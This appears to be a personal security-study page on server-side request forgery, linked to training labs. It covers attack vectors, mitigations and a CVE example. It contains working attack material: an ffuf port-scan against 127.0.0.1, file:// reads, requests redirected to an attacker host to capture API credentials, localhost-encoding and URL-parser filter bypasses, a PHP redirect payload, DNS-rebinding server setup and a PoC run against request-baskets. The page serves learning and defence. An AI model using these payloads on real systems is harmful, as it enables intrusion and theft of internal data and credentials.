# Server-Side Request Forgery (SSRF)

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)
[![adventofcyber2](../../../../_badges/thm/adventofcyber2/day19.svg)](https://tryhackme.com/room/adventofcyber2)
[![testingforssrf](../../../../_badges/owasp/testingforssrf.svg)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)
[![server_side_request_forgery](../../../../_badges/poat/server_side_request_forgery.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

<div class="row row-cols-lg-2"><div>

Server-Side Request Forgery (SSRF) is an attack in which a hacker can make a server request something from another server, usually an internal server or an API.

From instance, a website using an API. If there is a SSRF vulnerability, the hacker may be able to query the API by exploiting the website.

Common attack vectors

* üìö Headers <small>(mostly User-Agent)</small>
* üìÑ Forms <small>(internal API calls)</small>
* üç™ Cookies
* üåç Remote connections <small>(imports, file processing, etc.)</small>
</div><div>

Common usages are:

* üó∫Ô∏è Port mapping
* üó∫Ô∏è Access internal services
* üí∞ Steal sensitive data
* üí• Perform a DoS

There are two kinds of SSRF

* **Regular/in-band SSRF**: the client will see the result
* **Blind/out-band SSRF**: nothing is returned to the client

Refer to [request grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch requests.
</div></div>

<hr class="sep-both">

## SSRF Attack Vectors

<div class="row row-cols-lg-2"><div>

#### Remote URL Access

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![surfer](../../../../_badges/thm-p/surfer.svg)](https://tryhackme.com/r/room/surfer)

The most common scenario is when a website requests an external resources using user input, such as an external avatar URL.

A common scenario is a [PHP](/programming-languages/web/php/_general/index.md) call to `file_get_contents` to access a remote file. You have similar functions in other languages.

You may be able to:

* Map ports/services üó∫Ô∏è
* Steal files üí∞

#### Remote API Endpoint Access

[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)

If a website is making a request to an external API based on a endpoint controlled by the user, we may be able to access another unintended endpoint. Ex: `website.a/?api=path` $\to$ `website.b/path`.

You may be able to:

* Access unintended API endpoints üõ£Ô∏è
</div><div>

#### Remote API Access

[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)

If the programmer is using user input to determine which server will be queried, then the hacker may try to send the request to their servers instead, and get the API credentials inside the headers.

Ex: `a?api=xxx&r=path` $\to$ `xxx.b/path`

* We send the request to `https://xxx.thebestapi.example/path`
* If `api=malicious_website.com?&ignore=`, then the URL crafted is `https://malicious_website.com?&ignore=.thebestapi.com/path`!

You may be able to:

* Steal API tokens/credentials üíµ
</div></div>

<hr class="sep-both">

## SSRF Exploitation

<div class="row row-cols-lg-2"><div>

#### Mapping ports/services üó∫Ô∏è

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

You may inject URLs such as `http://localhost:22` to test if the port `22` is open. You can use fuzzing to enumerate all ports:

```ps
$ seq 1 65535 > ports.txt
$ ffuf -w ports.txt -u 'http://IP/?xxx=http://127.0.0.1:FUZZ' -fr 'Connection refused'
```

You could also make the server call `http://ifconfig.pro/` to get some information <small>(IP, DNS...)</small> to perform more advanced attacks.
</div><div>

#### Access Internal Services üó∫Ô∏è

[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)
[![surfer](../../../../_badges/thm-p/surfer.svg)](https://tryhackme.com/r/room/surfer)

You may be able to query internal IPs or internal websites.

#### Steal files üí∞

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

You may inject URLs to steal a file. For instance, a URL using the file protocol: `file://some/file/on/the/target`.

* [List of interesting files](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/arbitrary_file_access.md)
* You could also try to connect to your FTP server using `ftp://`.
</div></div>

<hr class="sep-both">

## Mitigations üõ°Ô∏è

<div class="row row-cols-lg-2"><div>

#### SSRF Mitigations ‚Äî Overview

[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

You should use strong access controls, network segmentation and firewalls, logging and monitoring to support input validation.

<br>

#### SSRF Mitigations ‚Äî Allow List

[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

We define a set of allowed URLs/resources. It can be bypassed  if the condition is too lax such as `"The URL must start with https://example.com"` which can be bypassed with:

* `https://example.com.malicious.website`
* `https://example.com@malicious.website`

Usually, we want to avoid manipulating URLs and instead determine the URL to use from the user input. It's not always possible.

<br>

#### SSRF Mitigations ‚Äî Deny List

[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

We define a set of forbidden URLs/resources while allowing every other. For instance, we allow every IP aside from  `127.0.0.1` and `169.254.169.254`. It can be bypassed too.

All of these addresses may resolve to, or are resolving to, `127.0.0.1`.

*  `0`, `00`, `000[...]0`, `0.0.0.0` (any IP, which may be localhost)
* `2130706433` (decimal), `017700000001` (octal), `0x7f000001` (hex)
* `127.1` (IP shortening), `127.00[...]00.1` (IP prolonging)
* `::1`, `::ffff:127.0.0.1` (IPV6)
* [127.0.0.1.nip.io](http://127.0.0.1.nip.io), [localtest.me](http://localtest.me), [lvh.me](http://lvh.me), etc.
* ...

</div><div>

#### SSRF Mitigations ‚Äî Resolve The Target

[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)

A good security would be to resolve the domain/IP to check the IP is resolving to a private IP network <small>(or a specific denied network)</small>.

```py
ip = socket.gethostbyname("example.com") # extracted from input
ip = ipaddress.ip_address(ip)
if ip in ipaddress.ip_network('127.0.0.0/8'): # check others!!!
    return False
if ipaddress.ip_address(ip).is_loopback:
    return False # only check if 127.0.0.1
```

There are two ways to bypass this. The first one is to use a HTML/PHP redirection. It only works if the victim is following HTTP redirections, which is the default setting in Python "requests" library.

```html!
<?php header('Location: http://127.0.0.1/'); ?>
```

The second one involves DNS Rebinding. This is only possible when the vulnerable code is making two DNS queries:

* One to verify the IP
* One to fetch the resource

```
ip = socket.gethostbyname("example.com") # 1.1.1.1 TTL 0
requests.get("example.com")              # 127.0.0.1
```

We will return a public IPV4 addresses for the domain we control with a low TTL to pass the check. As we used a low TTL, the host will perform a second DNS query in which we can return any IP.

We can use [rebinder](https://lock.cmpxchg8b.com/rebinder.html) <small>(website)</small>, [DNSrebinder](https://github.com/mogwailabs/DNSrebinder) <small>(0.1k ‚≠ê)</small>, [FakeDns](https://github.com/Crypt0s/FakeDns) <small>(0.5k ‚≠ê)</small>, or [singularity](https://github.com/nccgroup/singularity) <small>(1.0k ‚≠ê, web client and GOLang server)</small>.

You can use your own server. Add the following DNS configuration:

```
rebinding IN NS ns1337.example.com.
ns1337 IN A YOUR_SERVER_IP
```

Then, on your server, install and run a tool such as [FakeDns](https://github.com/Crypt0s/FakeDns):

```shell!
$ DEST="$HOME/tools/fakedns"
$ git clone -b "master" https://github.com/Crypt0s/FakeDns.git $DEST
$ ln -s $DEST/fakedns.py $HOME/.local/bin/fakedns
```

```shell!
$ cat test.conf
A rebinding.example.com 1.1.1.1 0%127.0.0.1
A rr.rebinding.example.com 1.1.1.1,127.0.0.1
$ fakedns -c test.conf --rebind # Run The DNS Server
```

* Input: `http://rebinding.example.com/admin`
* Input: `http://rr.rebinding.example.com/admin`

üìö You can bind multiple domains for exfiltration using JavaScript. Fetch the data from a domain and sent it to another domain.
</div></div>

<hr class="sep-both">

## Example CVEs

<div class="row row-cols-lg-2"><div>

#### CVE-2023-27163

[![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)

CVE in [request-baskets](https://github.com/darklynx/request-baskets). [POC (shell script)](https://github.com/entr0pie/CVE-2023-27163) <small>(0.03k ‚≠ê)</small>.

```shell!
$ ./CVE-2023-27163.sh http://target:port http://listener:port 
Creating the "<backet>" proxy basket...
Basket created!
$ curl http://target:port/<backet> # sent to listener URL
```

It can be used to access a resource behind a firewall.

```ps
$ ./CVE-2023-27163.sh http://target:port http://target:fport 
```
</div><div>

#### The GOAT Way üêê

In Python, the `requests` module uses a old version of URLLIB. The following URL `"https://example.com\@@127.0.0.1/../flag"` is interpreted differently between `requests` and `urllib` ([src](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)):

* `host=127.0.0.1\@@example.com path=/../flag` with URLLIB3+
* `host=127.0.0.1 path=/@@example.com/../flag` with URLLIB3

With this trick, you can bypass this dummy code:

```py
URL = "https://127.0.0.1\@@example.com/../flag"
hostname = urllib.parse.urlparse(URL)
# Will verify 127.0.0.1\@@example.com
if hardened_check_on_hostname(hostname):
    raise Exception()
# Will fetch 127.0.0.1/flag
print(requests.get(URL).text)
```

üìö This code is still vulnerable to DNS rebinding.
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Other attack vectors

* avatar form
* a script
* a header
* ...
</div><div>

* [Gopherus](https://github.com/tarunkant/Gopherus)
* [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
</div></div>